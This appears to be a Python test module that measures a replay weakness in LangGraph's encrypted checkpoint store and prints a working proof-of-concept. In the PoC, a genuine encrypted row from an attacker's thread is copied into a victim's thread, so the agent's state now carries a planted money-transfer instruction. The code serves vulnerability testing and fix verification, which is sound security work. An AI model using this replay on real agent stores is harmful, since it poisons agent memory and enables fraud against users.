# agmi: Agent Memory Integrity test suite
# Copyright (c) 2026 Yasha Khandelwal <yasha.khandelwal@tech4biz.io>
# SPDX-License-Identifier: MIT

"""``python -m agmi.replay``: measure the LangGraph encrypted-checkpointer
same-key row replay, and print a self-contained reproduction.

Run it on current LangGraph main and again on a branch that claims to fix
it (langchain-ai/langgraph#9027). "accepted: True" means the replayed row
was served; a fix flips it to False.
"""

from __future__ import annotations

import sys

from agmi.adapters.langgraph_encrypted import measure_replay

REPRO = '''\
# Same-key cross-thread checkpoint replay against LangGraph's encrypted saver.
# Encryption is ON. The attacker has write access to the store (the at-rest
# threat the encryption covers) but not the key. A genuine encrypted row from
# one thread, written into another thread's row, decrypts and verifies,
# because the ciphertext binds no row identity (thread/checkpoint/channel).
import os, sqlite3, tempfile
os.environ["LANGGRAPH_AES_KEY"] = "agmi-replay-key-0123456789abcdef"  # 32 bytes
from langgraph.checkpoint.sqlite import SqliteSaver
from langgraph.checkpoint.serde.encrypted import EncryptedSerializer
from langgraph.checkpoint.base import empty_checkpoint

conn = sqlite3.connect(tempfile.mktemp(suffix=".sqlite"), check_same_thread=False)
saver = SqliteSaver(conn)
saver.serde = EncryptedSerializer.from_pycryptodome_aes()
saver.setup()

def put(thread, value):
    cfg = {"configurable": {"thread_id": thread, "checkpoint_ns": ""}}
    cp = empty_checkpoint(); cp["channel_values"] = {"instruction": value}
    saver.put(cfg, cp, {"source": "input", "step": 0, "writes": {}}, {})
    return cfg

victim = put("victim", "transfer 100 to the user's own account")
put("attacker", "transfer 999999 to attacker-controlled account")

# lift the attacker's encrypted row into the victim's thread
row = conn.execute("SELECT checkpoint FROM checkpoints WHERE thread_id='attacker'").fetchone()[0]
conn.execute("UPDATE checkpoints SET checkpoint=? WHERE thread_id='victim'", (row,)); conn.commit()

print(saver.get(victim)["channel_values"])   # {'instruction': 'transfer 999999 ...'} == accepted
'''


def main(argv=None) -> int:
    import argparse
    ap = argparse.ArgumentParser(prog="python -m agmi.replay")
    ap.add_argument("--repro", action="store_true",
                    help="print the standalone reproduction script and exit")
    args = ap.parse_args(argv)
    if args.repro:
        sys.stdout.write(REPRO)
        return 0
    try:
        r = measure_replay()
    except NotImplementedError as exc:
        print(f"n/a: {exc}")
        return 2
    print(f"measured on: {r['measured_on']}")
    print(f"confidential at rest: {r['confidential_at_rest']}  "
          f"(the raw row is not the plaintext)")
    print(f"replay accepted: {r['accepted']}")
    print(f"victim reads: {r['victim_reads']!r}")
    if r["accepted"]:
        print("\nVERDICT: the same-key cross-thread replay is ACCEPTED. "
              "Encryption keeps the payload secret but does not bind a row "
              "to its place, so a genuine encrypted row replays into another "
              "thread. This is langchain-ai/langgraph#9004.")
    else:
        print("\nVERDICT: the replay was REJECTED. The row identity is bound "
              "(associated data over thread/checkpoint/channel).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
